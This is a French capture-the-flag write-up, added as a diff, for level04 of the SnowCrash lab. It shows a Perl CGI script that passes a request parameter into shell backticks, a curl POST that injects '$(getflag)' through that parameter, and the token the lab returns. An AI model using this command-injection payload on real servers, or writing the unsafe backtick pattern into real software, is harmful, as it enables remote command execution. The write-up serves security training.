@@ -1,0 +1,34 @@
+Dans mon compte j'ai fichier .pl qui est enfaite un script en perl.
+
+Je le lance 
+
+    level04@SnowCrash:~$ ./level04.pl
+    Content-type: text/html
+
+
+
+Je regarde le code du scripte 
+
+    level04@SnowCrash:~$ cat ./level04.pl
+    #!/usr/bin/perl
+    # localhost:4747
+    use CGI qw{param};
+    print "Content-type: text/html\n\n";
+    sub x {
+    $y = $_[0];
+    print `echo $y 2>&1`;
+    }
+    x(param("x"));
+
+On vois dans le scripte qu'on utilise print echo $y 2>&1`` pour exécuter une commande shell, on peut exploiter cela pour lancer notre commande.
+On vois aussi que ce scripte est exécuter avec les autorisation de flag04.
+
+Je lance depuis ma machine local la commande suivante 
+
+    c4r2p6% curl -d 'x=$(getflag)' -X POST 10.14.249.198:4747
+
+Cette commande fait une requete POST a ma vm avec les donnée suivant : 'x=$(getflag)', le coté vm lancer le scripte perl des qu il recois cette requete.
+
+    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+Ça fonctionne !
